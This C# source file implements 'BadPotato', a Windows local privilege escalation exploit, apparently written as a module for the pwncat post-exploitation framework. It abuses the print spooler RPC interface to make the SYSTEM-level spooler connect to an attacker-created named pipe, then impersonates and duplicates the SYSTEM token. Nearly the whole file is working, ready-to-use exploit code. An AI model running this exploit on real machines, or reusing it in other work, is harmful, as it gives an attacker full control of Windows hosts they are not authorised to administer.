using PingCastle.RPC;
using System;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Reflection;
using System.Collections.Generic;
using static PingCastle.RPC.rprn;

class Entry
{
    /*
     * Reflection technique to get the context of stage2.
     * This allows us to sanely raise exceptions that pwncat can be aware of
     */
    public static Type ProtocolError;
    public static void pwncat( Assembly stage2) { 
        ProtocolError = stage2.GetType("stagetwo.Protocol.ProtocolError");
    }
}

class BadPotato
{
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    enum BadPotatoErrors
    {
        CreateOutReadPipeFailure = 1,
        CreateErrReadPipeFailure,
        SetThreadTokenFailure,
        DuplicateTokenExFailure,
        OpenThreadTokenFailure,
        ImpersonateNamedPipeFailure,
        ConnectNamedPipeTimeout,
        RpcRemoteFindFirstPrinterChangeNotificationExFailure,
        RpcOpenPrinterFailure,
        CreateNamedPipeWFailure
    }

    static void error()
    {
        System.ComponentModel.Win32Exception exc = new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
        throw (Exception)Activator.CreateInstance(Entry.ProtocolError,new object[] { exc.ErrorCode, exc.Message });
    }

    public static Dictionary<string, object> bad_potato()
    {
        SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
        string pipeName = Guid.NewGuid().ToString("N");

        //Console.WriteLine("[*] PipeName : " + string.Format("\\\\.\\pipe\\{0}\\pipe\\spoolss", pipeName));
        //Console.WriteLine("[*] ConnectPipeName : " + string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName));

        IntPtr pipeHandle = CreateNamedPipeW(string.Format("\\\\.\\pipe\\{0}\\pipe\\spoolss", pipeName), 0x00000003| 0x40000000, 0x00000000, 10, 2048, 2048, 0, ref securityAttributes);
        if (pipeHandle!=IntPtr.Zero)
        {
            //Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "CreateNamedPipeW",pipeHandle));
            
            rprn rprn = new rprn();
            DEVMODE_CONTAINER dEVMODE_CONTAINER = new DEVMODE_CONTAINER();
            IntPtr rpcPrinterHandle = IntPtr.Zero;
            rprn.RpcOpenPrinter(string.Format("\\\\{0}", Environment.MachineName), out rpcPrinterHandle, null, ref dEVMODE_CONTAINER, 0);
            
            if (rpcPrinterHandle!=IntPtr.Zero)
            {
                if (rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(rpcPrinterHandle, 0x00000100, 0, string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName), 0) != -1)
                {
                    //Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "RpcRemoteFindFirstPrinterChangeNotificationEx", rpcPrinterHandle));
                    
                    Thread thread = new Thread(() => ConnectNamedPipe(pipeHandle, IntPtr.Zero));
                    thread.Start();
                    if (thread.Join(5000))
                    {
                        //Console.WriteLine("[*] ConnectNamePipe Success!");
                        
                        StringBuilder stringBuilder = new StringBuilder();
                        GetNamedPipeHandleState(pipeHandle, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Capacity);
                        
                        //Console.WriteLine("[*] CurrentUserName : " + Environment.UserName);
                        //Console.WriteLine("[*] CurrentConnectPipeUserName : " + stringBuilder.ToString());
                        
                        if (ImpersonateNamedPipeClient(pipeHandle))
                        {
                            //Console.WriteLine("[*] ImpersonateNamedPipeClient Success!");
                            
                            IntPtr hSystemToken = IntPtr.Zero;
                            if (OpenThreadToken(GetCurrentThread(), 983551, false, ref hSystemToken))
                            {
                                //Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "OpenThreadToken", hSystemToken));
                                IntPtr hSystemTokenDup = IntPtr.Zero;

                                if (DuplicateTokenEx(hSystemToken, 983551, 0, 2, 1, ref hSystemTokenDup))
                                {
                                    try
                                    {
                                       WindowsIdentity.Impersonate(hSystemTokenDup);
                                       return new Dictionary<string, object>();
                                    }
                                    catch {
                                        error();
                                    }
                                }
                                else
                                {
                                    error();
                                }
                            }
                            else
                            {
                                error();
                            }
                        }
                        else
                        {
                            error();
                        }
                    }
                    else
                    {
                        CloseHandle(rpcPrinterHandle);
                        CloseHandle(pipeHandle);
                        error();
                    }
                }
                else
                {
                    error();
                }
            }
            else
            {
                CloseHandle(pipeHandle);
                error();
            }
        }
        else
        {
            error();
        }

        return new Dictionary<string, object>();
    }

    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);
    [SecurityCritical]
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool CloseHandle(IntPtr handle);
    [DllImport("kernel32.dll", EntryPoint = "GetCurrentThread", CallingConvention = CallingConvention.Cdecl)]
    public static extern IntPtr GetCurrentThread();
    [SecurityCritical]
    [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateNamedPipeW(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout,ref SECURITY_ATTRIBUTES securityAttributes);
    [SecurityCritical]
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public  static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);
    [SecurityCritical]
    [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool GetNamedPipeHandleState(IntPtr hNamedPipe, IntPtr lpState, IntPtr lpCurInstances, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout, StringBuilder lpUserName, int nMaxUserNameSize);

    [SecurityCritical]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
    [SecurityCritical]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenThreadToken(IntPtr ThreadHandle, long DesiredAccess, bool OpenAsSelf,ref IntPtr TokenHandle);
    [SecurityCritical]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken,long dwDesiredAccess,int lpTokenAttributes,int ImpersonationLevel,int TokenType,ref IntPtr phNewToken);
    [SecurityCritical]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
    [DllImport("userenv.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CreateEnvironmentBlock(ref IntPtr lpEnvironment,IntPtr hToken,bool bInherit);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreatePipe(ref IntPtr hReadPipe,ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, Int32 nSize);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetHandleInformation(IntPtr hObject, int dwMask, int dwFlags);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped/*IntPtr.Zero*/);
    [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
}